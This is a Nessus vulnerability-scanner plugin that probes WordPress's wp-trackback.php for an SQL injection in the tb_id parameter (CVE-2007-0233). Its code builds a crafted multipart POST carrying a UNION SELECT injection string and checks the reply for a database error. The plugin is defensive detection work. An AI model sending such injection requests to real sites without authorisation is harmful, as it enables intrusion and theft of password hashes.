#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24014);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-0233");
  script_bugtraq_id(21983);
  script_xref(name:"OSVDB", value:"36860");

  script_name(english:"WordPress Trackback wp-trackback.php tb_id Parameter SQL Injection");
  script_summary(english:"Tries to generate a SQL error");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The version of WordPress on the remote host fails to properly sanitize
input to the 'tb_id' parameter of the 'wp-trackback.php' script before
using it in database queries.  An unauthenticated remote attacker can
leverage this issue to launch SQL injection attacks against the
affected application, including discovery of password hashes of
WordPress users. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' setting be enabled and that the remote version of
PHP be older than 4.4.3 or 5.1.4." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/3109" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/wp-trackback.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("need an ID for this to work" >< res)
  {
    # Try to exploit the flaw to generate a SQL error.
    sql = string(rand(), "/**/UNION/**/SELECT/**/", SCRIPT_NAME);
    boundary = "bound";
    req = string(	
      "POST ",  url, "?tb_id=1 HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="title"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="url"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "nessus\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="blog_name"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "nessus\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="tb_id"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      sql, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="496546471"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="1740009377"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "1\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see an error.
    if (
      "class='wpdberror'" >< res &&
      string(" WHERE ID = ", sql, "</code>") >< res
    )
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
